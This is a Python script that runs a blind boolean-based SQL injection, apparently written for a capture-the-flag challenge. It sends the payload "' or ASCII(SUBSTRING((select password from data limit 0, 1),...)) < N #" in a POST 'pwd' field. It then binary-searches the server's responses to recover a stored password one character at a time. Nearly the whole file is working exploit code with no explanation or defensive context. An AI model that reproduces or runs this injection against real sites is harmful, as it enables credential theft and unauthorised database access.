#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import string
import time
URL = ''
target = ""
def trace_request(req):
    print("[+] request start")
    print('{}\n{}\n\n{}'.format(
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))
    print("[+] request end")
def trace_response(res):
    print("[+] response start")
    print('{}\n{}\n\n{}'.format(
        res.status_code,
        '\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
        res.content,
    ))
    print("[+] response end")
def challenge(offset, guess):
    req = requests.Request(
        'POST',
        URL,
        data={
            "pwd" : "' or ASCII(SUBSTRING((select password from data limit 0, 1),{},1)) < {} #".format(offset + 1, guess)
        }
    )
    prepared = req.prepare()
    #trace_request(prepared)
    session = requests.Session()
    #start = time.time() # TimeBased
    res = session.send(prepared, allow_redirects = False)
    #elapsed_time = time.time() - start # TimeBased
    #trace_response(res)
    if "There is no flag" in res.content.decode("utf-8"):
        return True
    else:
        return False
def binarySearch(offset):
    low = 0
    high = 256
    while low <= high:
        guess = (low + high) // 2
        is_target_lessthan_guess = challenge(offset, guess)
        if is_target_lessthan_guess:
            high = guess
        else:
            low = guess
        if high == 1:
            return -1
        elif high - low == 1:
            return low
while True:
    code = binarySearch(len(target))
    if code == -1:
        break
    target += chr(code)
    print("[+] target: " + target)
print("[+] target: " + target)